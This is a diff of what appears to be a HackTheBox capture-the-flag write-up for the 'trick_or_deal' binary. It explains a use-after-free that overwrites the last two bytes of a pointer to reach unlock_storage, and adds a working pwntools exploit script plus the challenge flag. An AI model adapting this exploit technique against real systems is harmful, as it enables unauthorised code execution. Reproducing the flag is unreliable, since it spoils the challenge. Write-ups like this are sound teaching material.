@@ -63,9 +63,63 @@ update_weapons() is called at the main(), and it allocates a chunk on the heap. 
 ### FLOW
 
 ```
-At first, we free the storage by calling the steal(), since storage is not set to NULL, hence we can use the chunk later (it just freed, does not remove the contents).
+At first, we free the storage by calling the steal(), since storage is not set to NULL,
+hence we can use the chunk later (it just freed, does not remove the contents).
 
-Next we do malloc by calling the make_offer() and make a size of 80 to take the original chunk. Since we only need the last 2 bytes, hence we can fill the rest (72 buffer) with junk. Now we will get RCE at option 1. 
+Next we do malloc by calling the make_offer() and make a size of 80 to take the original chunk.
+Since we only need the last 2 bytes, hence we can fill the rest (72 buffer) with junk. Now we will get RCE at option 1. 
+```
+
+> SCRIPT
+
+```py
+from pwn import * 
+import os 
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+exe = './trick_or_deal'
+elf = context.binary = ELF(exe, checksec=True)
+#context.log_level = 'DEBUG'
+context.log_level = 'INFO'
+
+sh = start()
+
+sh.sendlineafter(b'?', b'4')
+sh.sendlineafter(b'?', b'3')
+sh.sendlineafter(b':', b'y')
+sh.sendlineafter(b'?', b'80') # 0x50
+
+p = flat([
+    asm('nop') * 72, #0x48
+    # since last 2 bytes hence --> pack 16
+    p16(elf.sym['unlock_storage'] & 0xffff) # Overwriting the last 2 bytes 
+])
+
+sh.sendafter(b'?', p) ## dunno why it can't send with the \n, but we get RCE without sending the newline.
+sh.sendlineafter(b'?', b'1') # get RCEEEE
+sh.interactive()
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/641dc649-6b51-4c94-aedc-9b0b3469dd93)
+
+
+> TEST REMOTELY
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d505c310-2d8c-45c6-a9c3-be0f622df283)
+
+
+## FLAG
+
+```
+HTB{tr1ck1ng_41nt_ch34t1ng}
 ```
 
 
